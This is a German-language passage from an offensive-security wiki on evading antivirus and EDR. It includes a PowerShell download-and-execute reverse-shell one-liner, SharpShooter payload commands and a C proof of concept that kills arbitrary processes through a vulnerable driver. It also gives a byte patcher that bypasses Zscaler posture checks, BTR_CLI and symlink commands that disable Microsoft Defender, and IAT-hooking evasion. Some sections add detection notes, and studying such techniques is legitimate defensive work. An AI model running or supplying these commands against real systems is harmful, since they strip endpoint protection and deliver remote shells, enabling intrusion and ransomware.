[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatischer Download und automatische Ausführung:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Liste der C#-Obfuscatoren: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Beispiel: Python zum Erstellen von Injectors verwenden

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Andere Tools

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Mehr

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – AV/EDR aus dem Kernel-Bereich ausschalten

Storm-2603 nutzte ein kleines Konsolendienstprogramm namens **Antivirus Terminator**, um den Endpunktschutz zu deaktivieren, bevor Ransomware abgelegt wurde. Das Tool bringt seinen **eigenen anfälligen, aber *signierten* Treiber** mit und missbraucht ihn, um privilegierte Kernel-Operationen auszuführen, die selbst Protected-Process-Light (PPL)-AV-Dienste nicht blockieren können.<sup>[[12]](#references)</sup>

Wichtigste Erkenntnisse
1. **Signierter Treiber**: Die auf dem Datenträger abgelegte Datei heißt `ServiceMouse.sys`, tatsächlich handelt es sich bei der Binärdatei jedoch um den rechtmäßig signierten Treiber `AToolsKrnl64.sys` aus Antiy Labs’ „System In-Depth Analysis Toolkit“. Da der Treiber eine gültige Microsoft-Signatur trägt, wird er auch bei aktivierter Driver-Signature-Enforcement-Funktion (DSE) geladen.
2. **Dienstinstallation**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Die erste Zeile registriert den Treiber als **Kernel-Service**, und die zweite startet ihn, sodass `\\.\ServiceMouse` aus dem Userland zugänglich wird.
3. **Vom Treiber bereitgestellte IOCTLs**
   | IOCTL-Code | Funktion                                |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Beliebigen Prozess anhand seiner PID beenden (wird verwendet, um Defender-/EDR-Dienste zu beenden) |
   | `0x990000D0` | Beliebige Datei auf dem Datenträger löschen |
   | `0x990001D0` | Treiber entladen und Service entfernen |

   Minimaler C-Proof-of-Concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Warum es funktioniert**: BYOVD umgeht den Schutz im User-Mode vollständig; im Kernel ausgeführter Code kann *geschützte* Prozesse öffnen, beenden oder Kernel-Objekte manipulieren – unabhängig von PPL/PP, ELAM oder anderen Härtungsfunktionen.

Erkennung / Abwehr
•  Aktivieren Sie Microsofts Sperrliste für anfällige Treiber (`HVCI`, `Smart App Control`), damit Windows das Laden von `AToolsKrnl64.sys` verhindert.
•  Überwachen Sie die Erstellung neuer *Kernel*-Dienste und lösen Sie einen Alarm aus, wenn ein Treiber aus einem weltweit beschreibbaren Verzeichnis geladen wird oder nicht auf der Allowlist steht.
•  Achten Sie auf Handles im User-Mode zu benutzerdefinierten Geräteobjekten, auf die verdächtige `DeviceIoControl`-Aufrufe folgen.

### Zscaler-Client-Connector-Posture-Checks durch Patchen von Binärdateien auf der Festplatte umgehen

Zscalers **Client Connector** wendet Gerätestatusregeln lokal an und nutzt Windows RPC, um die Ergebnisse an andere Komponenten zu übermitteln. Zwei schwache Designentscheidungen ermöglichen einen vollständigen Bypass:

1. Die Gerätestatusprüfung findet **vollständig clientseitig** statt (ein boolescher Wert wird an den Server gesendet).
2. Interne RPC-Endpunkte prüfen lediglich, ob die verbindende ausführbare Datei **von Zscaler signiert** ist (über `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Durch **Patchen von vier signierten Binärdateien auf der Festplatte** lassen sich beide Mechanismen neutralisieren:

| Binärdatei | Gepatchte ursprüngliche Logik | Ergebnis |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gibt immer `1` zurück, sodass jede Prüfung als konform gilt |
| `ZSAService.exe` | Indirekter Aufruf von `WinVerifyTrust` | NOP-ed ⇒ Jeder Prozess (auch ein nicht signierter) kann sich mit den RPC-Pipes verbinden |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Ersetzt durch `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integritätsprüfungen des Tunnels | Kurzgeschlossen |

Auszug aus einem minimalen Patcher:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Nach dem Ersetzen der Originaldateien und dem Neustart des Service-Stacks:

* **Alle** Posture-Checks werden als **grün/konform** angezeigt.
* Nicht signierte oder veränderte Binärdateien können die Named-Pipe-RPC-Endpunkte öffnen (z. B. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Der kompromittierte Host erhält uneingeschränkten Zugriff auf das interne Netzwerk, das durch die Zscaler-Richtlinien definiert ist.

Diese Fallstudie zeigt, wie sich rein clientseitige Vertrauensentscheidungen und einfache Signaturprüfungen mit wenigen Byte-Patches umgehen lassen.

## Microsoft Defender: Missbrauch vertrauenswürdiger Funktionen von `BTR.sys`

Der **Boot-Time Removal**-Treiber von Defender ist ein nützliches Gegenbeispiel zu klassischem BYOVD. `BTR.sys` ist eine legitime, von Microsoft signierte Komponente zur Behebung von Problemen, die weder eine Memory-Corruption-Schwachstelle noch eine IOCTL-Schnittstelle besitzt. Nachdem ein Operator Administratorzugriff und `SeLoadDriverPrivilege` erlangt hat, kann er stattdessen die private Remediation-Transaktion fälschen und die vorgesehenen Datei- und Registry-Operationen im Ring 0 ausführen. Dies ist ein **Primitive zur Neutralisierung von AV/EDR nach einer Kompromittierung, kein Initial Access oder Privilege Escalation**. Der Treiber lässt sich aus der `BOOTTIMETOOL`-Ressource der `MpEngine.dll` des Ziels extrahieren, statt einen auffälligen Treiber eines Drittanbieters einzubinden.<sup>[[36]](#references)</sup>

### Bereitstellen des einmalig verwendbaren Treibers

Defender legt die Ressource normalerweise als Datei mit einem zufälligen Namen im Format `[a-z]{8}.sys` ab und registriert einen ähnlich benannten Kernel-Service. `DriverEntry` liest den Wert `Args` des Service, öffnet den referenzierten NTFS ADS, entschlüsselt und validiert die Aktionsliste, schreibt Feedback und gibt nach erfolgreicher Ausführung `0xC0000056` (`STATUS_DELETE_PENDING`) zurück, damit der Treiber entladen wird, statt resident zu bleiben. Ein gefälschter Service weist die folgenden charakteristischen Werte auf.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Der `:changelist`-Stream enthält einen RC4-verschlüsselten Blob. Die analysierten Builds verwenden denselben festgelegten 256-Byte-Schlüssel wieder, sodass die Verschlüsselung keine Autorisierungsgrenze darstellt. Ein gültiger Klartext besteht aus einem 24-Byte-Global-Header (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, Header-CRC und einer aus der Payload abgeleiteten Transaktions-ID), gefolgt von einem nullterminierten UTF-16-Feedbackpfad und beliebig vielen Elementen. Jedes Element hat einen 16-Byte-Header (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) sowie aktionsspezifische Daten, die mit **genau vier NUL-Bytes** enden. Jede Header-/Datenregion wird unabhängig mit CRC-32-Polynom `0xEDB88320`, dem Initialzustand `0xFFFFFFFF` und **ohne abschließendes XOR** (`~CRC32`) geprüft; der CRC-Zustand wird für jede Region zurückgesetzt.<sup>[[36]](#references)[[37]](#references)</sup>

Die akzeptierten Aktions-IDs stellen diese Kernel-Primitiven bereit.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Elementdaten | Ergebnis |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Eine Datei löschen, auch wenn sie gesperrt ist |
| 2 | `[UTF-16 path]` | Ein leeres Verzeichnis entfernen |
| 3 | `[Flags][source][destination]` | Eine Datei in einen vom Angreifer ausgewählten geschützten Pfad verschieben; ein leeres Ziel bedeutet Löschen |
| 4 | `[Flags][key path]` | Einen Registry-Schlüssel rekursiv löschen |
| 5 | `[Flags][key path + "\\" + value]` | Einen Registry-Wert löschen |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Einen Registry-Wert erstellen/aktualisieren und fehlende Schlüsselpfade erstellen |

Bei den Aktionen 5 und 6 ist das Trennzeichen zwischen Schlüssel und Wert im übertragenen Format **zwei aufeinanderfolgende Backslashes**; ein herkömmlich formatierter Pfad wird nicht korrekt aufgeteilt. Die Feedbackdatei spiegelt größtenteils die Anfrage wider, aber die ersten vier Datenbytes jedes Elements werden zu dessen resultierendem `NTSTATUS`. Bei den Aktionen 1 und 2, die kein vorangestelltes Flags-Feld haben, verschiebt BTR den Pfad in die vier reservierten abschließenden Bytes, um Platz für diesen Status zu schaffen.<sup>[[36]](#references)</sup>

### `BTR_CLI`-Ablauf und Zeitfenster beim frühen Booten

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) implementiert die vollständige Kette: `BTR.sys` aus dem lokalen Defender extrahieren, `<random>.sys:changelist` und einen Feedback-Stream erstellen, verkettete Aktionen serialisieren, mit Prüfsummen versehen und verschlüsseln, den Service-Registry-Schlüssel direkt erstellen und anschließend `NtLoadDriver` für `-trigger now` aufrufen oder den Treiber für `-trigger boot` als Systemstarttreiber belassen. Die direkte Bereitstellung in der Registry umgeht den normalen SCM-Pfad über `CreateServiceW` und erzeugt daher **kein** Service-Install-Event mit der ID 7045. Durch den Boot-Trigger erstellte Artefakte können später mit `BTR_CLI.exe -cleanup <service_name>` entfernt werden.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` ist nicht verwendbar, da BTR bereits vor der Bereitschaft des Storage-Stacks und des `SystemRoot`-Links Datei-E/A-Vorgänge aus `DriverEntry` ausführt. `Start=1` in Verbindung mit der Gruppe `Boot Bus Extender` mit hoher Priorität führt stattdessen in Phase 1 zur Ausführung: NTFS ist verwendbar, aber viele sicherheitsrelevante Treiber mit Starttyp „System“ und EDR-Dienste im User-Mode wurden noch nicht initialisiert. Boot-Start-Filter wie `WdFilter` sind möglicherweise bereits geladen, doch BTR kann ihre Binärdateien oder Dienstkonfiguration vor dem nächsten Start entfernen und Dienstprogramme löschen, bevor SCM sie startet. ELAM schließt diese Lücke nicht, da BTR nach der Boot-Start-Auswertung ausgeführt wird und eine gültige Microsoft-Signatur besitzt.<sup>[[36]](#references)</sup>

Mehrere Aktionen werden in einer Transaktion ausgeführt. Der PoC stellt für die fest codierte Datei `\SystemRoot\Temp\BootClean.log` Action 1 voran: BTR erstellt dieses Protokoll, verarbeitet dann seine eigene Löschanforderung und entfernt es vor dem Entladen. Das reduziert die Spuren. Werden Rückmeldungen in `<random>.sys:<random>.dat` gespeichert, lassen sich der Treiber und beide Streams gemeinsam entfernen.<sup>[[36]](#references)[[37]](#references)</sup>

### Erkennungskorrelationen mit hoher Aussagekraft

Regeln, die nur auf Signaturen basieren, und die Microsoft-Liste blockierter anfälliger Treiber erfassen den Missbrauch der vorgesehenen BTR-Funktionalität nicht. Bevorzugt diese Verhaltenskorrelationen und unterscheidet dabei legitime Defender-Abstammung von einem beliebigen Launcher.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Die Erstellung von `.sys:changelist` ist ein universelles Merkmal des BTR-Stagings. Ein `.dat`-ADS an derselben `.sys`-Datei ist besonders verdächtig, da Defender Rückmeldungen normalerweise unter `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` ablegt.
- **Sysmon 12/13 ohne System 7045:** Korreliert die direkte Erstellung von `HKLM\SYSTEM\CurrentControlSet\Services\<random>` mit `Args=...:changelist` und `Group=Boot Bus Extender`, wenn kein entsprechendes SCM-Installationsereignis vorliegt.
- **Sysmon 6 -> 23:** Korreliert das Laden eines bekannten BTR-Treibers ohne Defender-Abstammung mit anschließender Dateilöschung durch `System`/PID 4, insbesondere bei Sicherheitsbinärdateien.
- **Sysmon 11 -> 23:** Löst einen Alarm aus, wenn `\SystemRoot\Temp\BootClean.log` schnell durch `System`/PID 4 erstellt und gelöscht wird.
- Beschränkt und überprüft die Zuweisung bzw. Aktivierung von `SeLoadDriverPrivilege`; eine Microsoft-Signatur allein reicht nicht als Vertrauensnachweis aus, wenn ein Treiber eines Sicherheitstools von `cmd.exe`, PowerShell oder einem unbekannten Prozess bereitgestellt wird.

## Protected Process Light (PPL) missbrauchen, um AV/EDR mit LOLBINs zu manipulieren

Protected Process Light (PPL) setzt eine Hierarchie aus Signierern und Schutzstufen durch, sodass nur gleich oder höher geschützte Prozesse einander manipulieren können. Wenn du offensiv einen PPL-fähigen Binary legitimerweise starten und dessen Argumente kontrollieren kannst, lässt sich gutartige Funktionalität (z. B. Protokollierung) in eine eingeschränkte, PPL-gestützte Schreibmöglichkeit für geschützte Verzeichnisse umwandeln, die von AV/EDR verwendet werden.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Was dafür sorgt, dass ein Prozess als PPL ausgeführt wird
- Die Ziel-EXE (und alle geladenen DLLs) muss mit einem PPL-fähigen EKU signiert sein.
- Der Prozess muss mit CreateProcess und den Flags `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS` erstellt werden.
- Es muss eine kompatible Schutzstufe angefordert werden, die dem Signierer der Binärdatei entspricht (z. B. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` für Anti-Malware-Signierer, `PROTECTION_LEVEL_WINDOWS` für Windows-Signierer). Falsche Stufen führen dazu, dass die Erstellung fehlschlägt.

Eine allgemeinere Einführung in PP/PPL und den LSASS-Schutz findest du hier:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher-Tools
- Open-Source-Hilfsprogramm: CreateProcessAsPPL (wählt die Schutzstufe aus und leitet Argumente an die Ziel-EXE weiter):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Verwendungsmuster:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN-Primitiv: ClipUp.exe
- Die signierte Systembinärdatei `C:\Windows\System32\ClipUp.exe` startet sich selbst erneut und akzeptiert einen Parameter, um eine Protokolldatei an einem vom Aufrufer angegebenen Pfad zu schreiben.
- Wird der Prozess als PPL gestartet, erfolgt der Schreibvorgang mit PPL-Rechten.
- ClipUp kann keine Pfade mit Leerzeichen verarbeiten; verwende 8.3-Kurznamen, um auf normalerweise geschützte Speicherorte zu verweisen.

Hilfsbefehle für 8.3-Kurznamen
- Kurznamen auflisten: `dir /x` in jedem übergeordneten Verzeichnis.
- Kurzen Pfad in cmd ermitteln: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Missbrauchskette (abstrakt)
1) Starte das PPL-fähige LOLBIN (ClipUp) mit `CREATE_PROTECTED_PROCESS` über einen Starter (z. B. CreateProcessAsPPL).
2) Übergib das ClipUp-Argument für den Protokollpfad, um das Erstellen einer Datei in einem geschützten AV-Verzeichnis zu erzwingen (z. B. Defender Platform). Verwende bei Bedarf 8.3-Kurznamen.
3) Wenn die Zieldatei normalerweise während des Betriebs vom AV geöffnet bzw. gesperrt ist (z. B. MsMpEng.exe), plane den Schreibvorgang beim Systemstart ein, bevor der AV-Dienst startet, indem du einen Autostartdienst installierst, der zuverlässig früher ausgeführt wird. Überprüfe die Startreihenfolge mit Process Monitor (Boot-Protokollierung).
4) Beim Neustart erfolgt der durch PPL abgesicherte Schreibvorgang, bevor der AV-Dienst seine Binärdateien sperrt. Dadurch wird die Zieldatei beschädigt und der Start verhindert.

Beispielaufruf (Pfade aus Sicherheitsgründen gekürzt oder unkenntlich gemacht):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Hinweise und Einschränkungen
- Du kannst den Inhalt, den ClipUp schreibt, nicht kontrollieren, sondern nur den Speicherort; die Primitive eignet sich daher eher für Beschädigungen als für präzise Inhaltsinjektion.
- Zum Installieren/Starten eines Dienstes und für ein Zeitfenster zum Neustart sind lokale Administratorrechte/SYSTEM erforderlich.
- Das Timing ist entscheidend: Das Ziel darf nicht geöffnet sein; die Ausführung beim Booten vermeidet Dateisperren.

Erkennungen
- Prozesserstellung von `ClipUp.exe` mit ungewöhnlichen Argumenten, insbesondere wenn der übergeordnete Prozess ein nicht standardmäßiger Launcher ist und dies rund um den Bootvorgang geschieht.
- Neue Dienste, die so konfiguriert sind, dass sie verdächtige Binärdateien automatisch starten und konsistent vor Defender/AV starten. Untersuche die Erstellung/Änderung von Diensten vor Fehlern beim Start von Defender.
- Überwachung der Dateiintegrität von Defender-Binärdateien/Platform-Verzeichnissen; unerwartete Dateierstellungen/-änderungen durch Prozesse mit Protected-Process-Flags.
- ETW/EDR-Telemetrie: Achte auf Prozesse, die mit `CREATE_PROTECTED_PROCESS` erstellt wurden, und auf eine anomale Verwendung von PPL-Stufen durch Nicht-AV-Binärdateien.

Mitigations
- WDAC/Code Integrity: Beschränke, welche signierten Binärdateien als PPL und unter welchen übergeordneten Prozessen ausgeführt werden dürfen; blockiere den Aufruf von ClipUp außerhalb legitimer Kontexte.
- Diensthygiene: Beschränke die Erstellung/Änderung von automatisch startenden Diensten und überwache Manipulationen der Startreihenfolge.
- Stelle sicher, dass der Manipulationsschutz von Defender und der Early-Launch-Schutz aktiviert sind; untersuche Startfehler, die auf eine Beschädigung von Binärdateien hindeuten.
- Ziehe in Betracht, die Generierung von 8.3-Kurznamen auf Volumes zu deaktivieren, auf denen Sicherheitstools liegen, sofern dies mit deiner Umgebung kompatibel ist (gründlich testen).

## Manipulation von Microsoft Defender durch einen Symlink-Hijack des Platform-Versionsordners

Windows Defender wählt die Plattform, von der es ausgeführt wird, indem es Unterordner in folgendem Verzeichnis auflistet:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Es wählt den Unterordner mit der lexikografisch höchsten Versionszeichenfolge (z. B. `4.18.25070.5-0`) aus und startet dann die Defender-Dienstprozesse von dort (wobei die Dienst-/Registrierungspfade entsprechend aktualisiert werden). Bei dieser Auswahl werden Verzeichniseinträge einschließlich Verzeichnis-Reparse-Points (Symlinks) berücksichtigt. Ein Administrator kann dies nutzen, um Defender auf einen vom Angreifer beschreibbaren Pfad umzuleiten und DLL sideloading oder eine Dienstunterbrechung zu erreichen.<sup>[[21]](#references)[[22]](#references)</sup>

Voraussetzungen
- Lokaler Administrator (erforderlich, um Verzeichnisse/Symlinks im Platform-Ordner zu erstellen)
- Möglichkeit zum Neustart oder zum Auslösen einer erneuten Plattformauswahl durch Defender (Dienstneustart beim Booten)
- Es sind nur integrierte Tools erforderlich (`mklink`)

Warum es funktioniert
- Defender blockiert Schreibvorgänge in seinen eigenen Ordnern, aber bei der Plattformauswahl werden Verzeichniseinträge als vertrauenswürdig behandelt und der lexikografisch höchste Versionsordner ausgewählt, ohne zu überprüfen, ob das Ziel auf einen geschützten/vertrauenswürdigen Pfad verweist.

Schritt für Schritt (Beispiel)
1) Erstelle eine beschreibbare Kopie des aktuellen Plattformordners, z. B. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Erstelle innerhalb von Platform einen Verzeichnis-Symlink mit einer höheren Versionsnummer, der auf deinen Ordner verweist:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Trigger-Auswahl (Neustart empfohlen):
```cmd
shutdown /r /t 0
```
4) Überprüfen, dass MsMpEng.exe (WinDefend) vom umgeleiteten Pfad ausgeführt wird:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
You should observe den neuen Prozesspfad unter `C:\TMP\AV\` und dass die Servicekonfiguration/Registry diesen Speicherort widerspiegelt.

Post-exploitation options
- DLL sideloading/code execution: Lege DLLs, die Defender aus seinem Anwendungsverzeichnis lädt, ab oder ersetze sie, um Code in den Prozessen von Defender auszuführen. Siehe den Abschnitt oben: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Entferne den Versions-Symlink, damit der konfigurierte Pfad beim nächsten Start nicht aufgelöst werden kann und Defender nicht startet:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Beachte, dass diese Technik allein keine Rechteausweitung ermöglicht; sie erfordert Administratorrechte.

## API/IAT-Hooking + Call-Stack-Spoofing mit PIC (im Stil von Crystal Kit)

Red Teams können Runtime-Evasion aus dem C2-Implantat in das Zielmodul selbst verlagern, indem sie dessen Import Address Table (IAT) hooken und ausgewählte APIs über angreifergesteuerten, positionsunabhängigen Code (PIC) umleiten. Dadurch lässt sich die Evasion über die kleine API-Oberfläche hinaus verallgemeinern, die viele Kits bereitstellen (z. B. CreateProcessA), und derselbe Schutz kann auch auf BOFs und Post-Exploitation-DLLs ausgeweitet werden.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Vorgehensweise auf hoher Ebene
- Lade einen PIC-Blob mithilfe eines Reflective Loaders (vorangestellt oder als Begleitdatei) zusammen mit dem Zielmodul. Der PIC muss eigenständig und positionsunabhängig sein.
- Durchsuche beim Laden der Host-DLL deren IMAGE_IMPORT_DESCRIPTOR und ändere die IAT-Einträge für ausgewählte Imports (z. B. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), sodass sie auf schlanke PIC-Wrapper verweisen.
- Jeder PIC-Wrapper führt vor dem Tail-Call der echten API Evasions aus. Typische Evasions sind:
  - Memory-Maskierung/-Demaskierung rund um den Aufruf (z. B. Beacon-Bereiche verschlüsseln, RWX→RX, Seitennamen/Berechtigungen ändern) und anschließend wiederherstellen.
  - Call-Stack-Spoofing: einen unauffälligen Stack erstellen und zur Ziel-API wechseln, sodass die Call-Stack-Analyse erwartete Frames ermittelt.<sup>[[9]](#references)</sup>
- Exportiere aus Kompatibilitätsgründen eine Schnittstelle, über die ein Aggressor-Skript (oder ein entsprechendes Skript) registrieren kann, welche APIs für Beacon, BOFs und Post-Ex-DLLs gehookt werden sollen.

Warum hier IAT-Hooking
- Funktioniert für jeden Code, der den gehookten Import verwendet, ohne den Tool-Code zu ändern oder sich darauf zu verlassen, dass Beacon bestimmte APIs proxyt.
- Deckt Post-Ex-DLLs ab: Durch das Hooken von LoadLibrary* kannst du das Laden von Modulen (z. B. System.Management.Automation.dll, clr.dll) abfangen und dieselbe Maskierung/Stack-Evasion auf deren API-Aufrufe anwenden.
- Ermöglicht die zuverlässige Verwendung von Post-Ex-Befehlen, die Prozesse starten, gegen Call-Stack-basierte Erkennungen, indem CreateProcessA/W gewrappt wird.

Minimales IAT-Hook-Schema (x64-C/C++-Pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Hinweise
- Wende den Patch nach Relocations/ASLR und vor der ersten Verwendung des Imports an. Reflective Loader wie TitanLdr/AceLdr zeigen, wie Hooking während DllMain des geladenen Moduls erfolgt.
- Halte Wrapper klein und PIC-sicher; löse die echte API über den ursprünglichen IAT-Wert auf, den du vor dem Patchen gespeichert hast, oder über LdrGetProcedureAddress.
- Verwende für PIC RW → RX-Übergänge und lasse keine Seiten mit Schreib- und Ausführungsrechten zurück.

Call‑stack spoofing stub
- PIC-Stubs im Draugr-Stil erstellen eine gefälschte Call-Kette (mit Return-Adressen in benignen Modulen) und springen dann zur echten API.
- Damit werden Erkennungsverfahren umgangen, die bei sensiblen APIs kanonische Stacks von Beacon/BOFs erwarten.
- Kombiniere dies mit Stack-Cutting-/Stack-Stitching-Techniken, um vor dem API-Prolog in erwartete Frames zu gelangen.

Operative Integration
- Stelle den Reflective Loader den post-ex-DLLs voran, damit PIC und Hooks beim Laden der DLL automatisch initialisiert werden.
- Verwende ein Aggressor-Script, um Ziel-APIs zu registrieren, sodass Beacon und BOFs ohne Codeänderungen transparent denselben Evasion-Pfad nutzen.

Erkennungs-/DFIR-Aspekte
- IAT-Integrität: Einträge, die auf Adressen außerhalb von Images (Heap/anonym) aufgelöst werden; regelmäßige Überprüfung von Import-Zeigern.
- Stack-Anomalien: Return-Adressen, die zu keinem geladenen Image gehören; abrupte Übergänge zu PIC außerhalb von Images; inkonsistente RtlUserThreadStart-Abstammung.
- Loader-Telemetrie: Schreibvorgänge im Prozess auf die IAT, frühe DllMain-Aktivität, die Import-Thunks verändert, unerwartete RX-Bereiche, die beim Laden erstellt werden.
